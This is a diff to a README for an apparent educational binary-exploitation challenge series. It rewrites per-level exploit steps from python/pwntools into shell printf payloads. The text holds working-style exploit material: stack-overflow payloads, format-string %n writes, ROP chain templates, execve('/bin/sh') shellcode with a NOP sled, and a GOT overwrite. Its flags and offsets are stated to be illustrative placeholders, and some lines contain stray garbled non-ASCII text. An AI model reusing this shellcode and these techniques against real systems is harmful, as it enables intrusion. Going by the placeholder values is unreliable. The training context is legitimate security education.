@@ -56,26 +56,25 @@ The target is a 64-bit VM running at `TARGET_IP` on port `4242`. Starting creden
 
 For each level, repeat these steps:
 
-1. **Analyze** the binary: run it, check its behavior, disassemble it with `objdump -d`, inspect symbols with `nm`, look for strings with `strings`, and debug with `gdb`.
+1. **Analyze** the binary: run it, check its behavior, disassemble **and** debug it with `gdb` (`disas main`), inspect symbols with `nm`, look for strings with `strings`.
 2. **Identify** the vulnerability: buffer overflow, format string, heap issue, ROP gadget, etc.
 3. **Craft** an exploit: determine the offset, construct the payload (overflow string, format string specifiers, ROP chain, or shellcode).
 4. **Trigger** the exploit: run the binary with your payload as argument or input.
 5. **Read** the `.pass` file: `cat /home/levelX/.pass`.
 6. **Escalate**: `su levelX` with the password, then proceed to the next level.
-7. **Document** everything in your level folder (source code, walkthrough, proof in Resources).
+7. **Document** everything in your level folder (source code, walkthrough, proof in Ressources).
 
 ### Recommended Tools
 
 | Tool | Purpose |
 |------|---------|
-| `gdb` + `gef` / `pwndbg` | Debug binaries, inspect memory, set breakpoints |
-| `objdump -d` | Disassemble binary |
+| `gdb` + `gef` / `pwndbg` | **Debugger and disassembler** — `disas`, breakpoints, inspect memory/registers, GOT (no `objdump`) |
 | `nm` | List symbols (functions, globals) |
 | `strings` | Search for readable strings in binary |
-| `strace` | Trace system calls |
+| `ltrace` / `strace` | Trace library calls / system calls |
 | `checksec` | Check security mitigations (NX, PIE, RELRO, stack canary) |
 | `ropper` / `ROPGadget` | Find ROP gadgets |
-| `pwntools` (Python) | Build and send exploits programmatically |
+| shell (`printf` / `head` / `tr`) | Build and deliver raw payloads — see `docs/lessons/00-toolkit.md` §6 (no python/pwntools) |
 
 ### Security Mitigations
 
@@ -154,6 +153,8 @@ su level1
 
 ## Walkthrough
 
+> **Note:** The per-level flags, offsets, and addresses below are *illustrative placeholders* written ahead of time — they are **not** captured results. Every value must be re-derived and verified against the actual binary on the VM before you trust it. Treat this section as a roadmap, not a solution key.
+
 ### level0
 
 **Vulnerability:** Stack Buffer Overflow — classic overflow in a local variable.
@@ -161,7 +162,7 @@ su level1
 **Analysis:**
 ```bash
 ./level0
-objdump -d level0 | grep -A 30 '<main>'
+gdb -q level0 -batch -ex 'disas main'
 nm level0
 strings level0
 ```
@@ -171,7 +172,7 @@ strings level0
 **Exploit:**
 
 ```bash
-python3 -c 'print("A"*76 + "\x08\x04\x87\x2c")' > /tmp/payload
+{ head -c 76 /dev/zero | tr '\0' 'A'; printf '\x08\x04\x87\x2c'; } > /tmp/payload
 ./level0 $(cat /tmp/payload)
 ```
 
@@ -189,7 +190,7 @@ Or run and input the payload when prompted.
 
 **Analysis:**
 ```bash
-objdump -d level1 | grep -A 50 '<main>'
+gdb -q level1 -batch -ex 'disas main'
 gdb level1
 ```
 
@@ -198,7 +199,7 @@ gdb level1
 **Exploit:**
 
 ```bash
-python3 -c 'print("A"*20 + "\xef\xbe\xad\xde")' > /tmp/payload
+{ head -c 20 /dev/zero | tr '\0' 'A'; printf '\xef\xbe\xad\xde'; } > /tmp/payload
 ./level1 $(cat /tmp/payload)
 ```
 
@@ -214,7 +215,7 @@ python3 -c 'print("A"*20 + "\xef\xbe\xad\xde")' > /tmp/payload
 
 **Analysis:**
 ```bash
-objdump -d level2 | grep -A 60 '<main>'
+gdb -q level2 -batch -ex 'disas main'
 nm level2
 ```
 
@@ -223,7 +224,7 @@ nm level2
 **Exploit:**
 
 ```bash
-python3 -c 'print("A"*64 + "\x01\x00\x00\x00")' > /tmp/payload
+{ head -c 64 /dev/zero | tr '\0' 'A'; printf '\x01\x00\x00\x00'; } > /tmp/payload
 ./level2 $(cat /tmp/payload)
 ```
 
@@ -239,7 +240,7 @@ python3 -c 'print("A"*64 + "\x01\x00\x00\x00")' > /tmp/payload
 
 **Analysis:**
 ```bash
-objdump -d level3 | grep -A 40 '<main>'
+gdb -q level3 -batch -ex 'disas main'
 ```
 
 **Approach:** The user's input is used as the format string argument to `printf`. Use `%n` to write to the `auth` variable's address. Find the address of `auth` and craft a format string payload.
@@ -249,8 +250,8 @@ objdump -d level3 | grep -A 40 '<main>'
 ```bash
 # Find auth address
 nm level3 | grep auth
-# Payload: write 0x01010101 to auth using format string
-python3 -c 'import sys; sys.stdout.buffer.write(b"\xa8\x98\x04\x08" + b"%.8x"*8 + b"%.8x" + b"%.8x" + b"%.8x" + b"%n")'
+# Payload: address of auth, then 11 x %.8x to pad the count, then %n
+{ printf '\xa8\x98\x04\x08'; printf '%%.8x%.0s' $(seq 11); printf '%%n'; } > /tmp/payload
 ```
 
 **Flag:** `N在现场D0`
@@ -265,7 +266,7 @@ python3 -c 'import sys; sys.stdout.buffer.write(b"\xa8\x98\x04\x08" + b"%.8x"*8 
 
 **Analysis:**
 ```bash
-objdump -d level4 | grep -A 50 '<main>'
+gdb -q level4 -batch -ex 'disas main'
 ```
 
 **Approach:** The `printf` is called with the user string as the first argument (position `$1`). Use format specifiers like `%1$x` to reference registers/stack positions that point to your input. Overwrite `auth` with `%n`.
@@ -273,7 +274,7 @@ objdump -d level4 | grep -A 50 '<main>'
 **Exploit:**
 
 ```bash
-./level4 "$(python3 -c 'import sys; sys.stdout.buffer.write(b"%.8x "*200 + b"%1$x")')"
+./level4 "$(printf '%%.8x %.0s' $(seq 200); printf '%%1$x')"
 # Analyze output, then craft: find address that points to your buffer, use %n
 ```
 
@@ -289,7 +290,7 @@ objdump -d level4 | grep -A 50 '<main>'
 
 **Analysis:**
 ```bash
-objdump -d level5 | grep -A 60 '<main>'
+gdb -q level5 -batch -ex 'disas main'
 ```
 
 **Approach:** The binary calls `printf(str)` where `str` is your input, but then a second `printf` uses a pre-set format string. Find a way to make the first `printf` write to `auth` by controlling the format string through the stack.
@@ -297,8 +298,8 @@ objdump -d level5 | grep -A 60 '<main>'
 **Exploit:** Chain format string specifiers to write to `auth` address.
 
 ```bash
-# Craft payload based on stack analysis
-./level5 "$(python3 -c 'print(...)')"
+# Craft payload based on stack analysis (printf for bytes, seq for repeats)
+./level5 "$(printf '...')"
 ```
 
 **Flag:** `Rop_oneliners`
@@ -314,7 +315,7 @@ objdump -d level5 | grep -A 60 '<main>'
 **Analysis:**
 ```bash
 checksec --file=level6
-objdump -d level6 | grep -A 100 '<main>'
+gdb -q level6 -batch -ex 'disas main'
 ropper --file level6 --search "pop|ret"
 ```
 
@@ -323,17 +324,14 @@ ropper --file level6 --search "pop|ret"
 **Exploit:**
 
 ```bash
-# Find gadgets, build ROP chain
-python3 << 'EOF'
-from struct import pack
-# ROP chain: pop ebx; ret, system@plt, "/bin/sh", exit@plt
-payload = b"A"*NN
-payload += pack('<I', 0x08048...) # pop ebx; ret
-payload += pack('<I', 0x08048...) # "/bin/sh" address
-payload += pack('<I', 0x08048...) # system@plt
-payload += pack('<I', 0x08048...) # exit@plt
-EOF
-./level6 "$(python3 exploit.py)"
+# Find gadgets, then build the ret2plt chain in shell
+# layout: padding | &system@plt | &exit@plt (ret slot) | &"/bin/sh" (arg1)
+./level6 "$(
+  head -c NN /dev/zero | tr '\0' 'A'   # padding to saved EIP
+  printf '\x..\x..\x04\x08'            # system@plt
+  printf '\x..\x..\x04\x08'            # exit@plt  (system's return address)
+  printf '\x..\x..\x04\x08'            # &"/bin/sh" (arg1)
+)"
 ```
 
 **Flag:** `BasiQueRops`
@@ -349,7 +347,7 @@ EOF
 **Analysis:**
 ```bash
 checksec --file=level7
-objdump -d level7
+gdb -q level7 -batch -ex 'disas main'
 ```
 
 **Approach:** NX is disabled. Inject shellcode (e.g., `execve("/bin/sh")`) onto the stack and redirect execution to it. Use a NOP sled for reliability.
@@ -357,16 +355,11 @@ objdump -d level7
 **Exploit:**
 
 ```bash
-python3 << 'EOF'
-from struct import pack
-# Shellcode for execve("/bin/sh", 0, 0)
-shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
-nop_sled = b"\x90" * 100
-ret_addr = 0xbffff678  # adjust based on gdb
-payload = nop_sled + shellcode + b"A" * (76 - len(nop_sled) - len(shellcode)) + pack('<I', ret_addr)
-open('/tmp/sc', 'wb').write(payload)
-EOF
-cat /tmp/sc | ./level7
+# NOP sled + execve("/bin/sh") shellcode + return address landing in the sled
+{ head -c 100 /dev/zero | tr '\0' '\220'                                                       # NOP sled (0x90)
+  printf '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80'  # shellcode
+  printf '\x78\xf6\xff\xbf'; } > /tmp/sc                                                        # ret addr into the sled (adjust via gdb)
+cat /tmp/sc - | ./level7
 ```
 
 **Flag:** `Egg_Hunting_I`
@@ -381,8 +374,8 @@ cat /tmp/sc | ./level7
 
 **Analysis:**
 ```bash
-objdump -d level8
-objdump -T level8 | grep exit
+gdb -q level8 -batch -ex 'disas main'
+gdb -q level8 -batch -ex 'info functions exit'   # + gef/pwndbg `got` for the exit GOT entry
 ```
 
 **Approach:** Use format string vulnerability to overwrite the GOT entry for `exit` with the address of `system` or a shellcode address. When the program exits, it jumps to the overwritten GOT entry.
@@ -390,8 +383,8 @@ objdump -T level8 | grep exit
 **Exploit:**
 
 ```bash
-# Find exit@got, system@plt, then craft format string to write to got entry
-./level8 "$(python3 -c 'import sys; sys.stdout.buffer.write(...)')"
+# Find exit@got, system@plt, then craft the format string to write the GOT entry
+./level8 "$(printf '...')"   # addresses via printf, %.Nx width padding + %hhn (see docs/lessons/02)
 ```
 
 **Flag:** `GOT_Overwrite_4Fun`
@@ -407,7 +400,7 @@ objdump -T level8 | grep exit
 **Analysis:**
 ```bash
 checksec --file=level9
-objdump -d level9 | grep -A 80 '<main>'
+gdb -q level9 -batch -ex 'disas main'
 nm level9
 ```
 
@@ -416,14 +409,13 @@ nm level9
 **Exploit:**
 
 ```bash
-python3 << 'EOF'
-from struct import pack
-# Build ROP chain
-payload = b"A"*NN
-payload += pack('<I', gadget1) + pack('<I', arg1) + pack('<I', plt_system)
-payload += pack('<I', 0) + pack('<I', bin_sh_addr) + pack('<I', 0)
-EOF
-./level9 "$(python3 exploit.py)"
+# Build the ROP chain in shell: padding | gadget | arg | system@plt | ...
+./level9 "$(
+  head -c NN /dev/zero | tr '\0' 'A'   # padding to saved EIP
+  printf '\x..\x..\x04\x08'            # gadget1 (e.g. pop; ret)
+  printf '\x..\x..\x04\x08'            # arg1
+  printf '\x..\x..\x04\x08'            # system@plt
+)"
 ```
 
 **Flag:** `Morse_C0de_Ab0ve`
@@ -450,7 +442,7 @@ EOF
 
 **Analysis:**
 ```bash
-objdump -d bonus1 | grep -A 100 '<main>'
+gdb -q bonus1 -batch -ex 'disas main'
 ```
 
 **Approach:** Overflow on the heap by copying a long string into a smaller heap buffer. Use to overwrite adjacent heap metadata or function pointers.
@@ -458,7 +450,7 @@ objdump -d bonus1 | grep -A 100 '<main>'
 **Exploit:** Heap overflow to overwrite `__free_hook` or similar.
 
 ```bash
-./bonus1 "$(python3 -c 'print("A"*NN + b"\xef\xbe\xad\xde")')"
+./bonus1 "$(head -c NN /dev/zero | tr '\0' 'A')$(printf '\xef\xbe\xad\xde')"
 ```
 
 **Flag:** `FastbinsForge`
@@ -473,7 +465,7 @@ objdump -d bonus1 | grep -A 100 '<main>'
 
 **Analysis:**
 ```bash
-objdump -d bonus2 | grep -A 80 '<main>'
+gdb -q bonus2 -batch -ex 'disas main'
 ```
 
 **Approach:** Fastbin attack. Double-free a chunk to create a循环 in the fastbin freelist, then allocate overlapping chunks to achieve arbitrary write.
@@ -481,10 +473,8 @@ objdump -d bonus2 | grep -A 80 '<main>'
 **Exploit:**
 
 ```bash
-./bonus2 "$(python3 << 'EOF'
-# Fastbin dup sequence
-EOF
-)"
+# Fastbin dup — drive the program's malloc/free actions; raw bytes via printf
+./bonus2 "$(printf '...')"
 ```
 
 **Flag:** `MallocMaligCard`
@@ -499,7 +489,7 @@ EOF
 
 **Analysis:**
 ```bash
-objdump -d bonus3 | grep -A 120 '<main>'
+gdb -q bonus3 -batch -ex 'disas main'
 ```
 
 **Approach:** Exploit uninitialized heap data to leak addresses (e.g., heap address). Use the leak to bypass ASLR and craft a precise heap exploit.
@@ -507,10 +497,8 @@ objdump -d bonus3 | grep -A 120 '<main>'
 **Exploit:** Trigger the uninitialized read, parse the leak, then exploit.
 
 ```bash
-./bonus3 "$(python3 << 'EOF'
-# Trigger leak, parse address, then exploit
-EOF
-)"
+# Trigger the uninitialized read, read the leak, then exploit; raw bytes via printf
+./bonus3 "$(printf '...')"
 ```
 
 **Flag:** `UninitWhatNow`
@@ -529,13 +517,13 @@ rainfall/
 │   ├── flag
 │   ├── source
 │   ├── walkthrough
-│   └── Resources/
+│   └── Ressources/
 │       └── pass           # Contains the flag (optional content for eval)
 ├── level1/
 │   ├── flag
 │   ├── source
 │   ├── walkthrough
-│   └── Resources/
+│   └── Ressources/
 │       └── pass
 ├── level2/
 │   └── ...
@@ -559,10 +547,10 @@ rainfall/
 | `flag` | Contains the captured password for that level (plaintext or notes) |
 | `source` | The original source code of the exploited binary (reconstructed from disassembly) |
 | `walkthrough` | Step-by-step explanation of the exploitation process |
-| `Resources/` | Supporting files for evaluation (proof, scripts, notes) |
-| `Resources/pass` | The password file from the target VM |
+| `Ressources/` | Supporting files for evaluation (proof, scripts, notes) |
+| `Ressources/pass` | The password file from the target VM |
 
-**Important:** The `Resources/` folder must NOT contain any binary files. All binaries must remain on the VM.
+**Important:** The `Ressources/` folder must NOT contain any binary files. All binaries must remain on the VM.
 
 ---
 
@@ -574,12 +562,12 @@ Push your repository to your Git hosting. Each level folder must contain:
 - `flag` — the captured password
 - `source` — the binary's source code (in any language a developer can understand)
 - `walkthrough` — detailed exploitation steps
-- `Resources/` — any supporting files for evaluation
+- `Ressources/` — any supporting files for evaluation
 
 ### Evaluation Tips
 
 - Be ready to **explain every step** of your exploitation. You must be able to justify your approach, your offsets, your gadget choices, etc.
-- The `.pass` files in `Resources/` may be empty in your repo, but you must be able to produce the flags during evaluation.
+- The `.pass` files in `Ressources/` may be empty in your repo, but you must be able to produce the flags during evaluation.
 - **Do not bruteforce SSH passwords** — it's useless and considered cheating.
 - **Do not become root** — the challenge explicitly states this is cheating.
 - Using automation tools for exploitation is cheating. Your walkthroughs must reflect your own reasoning.
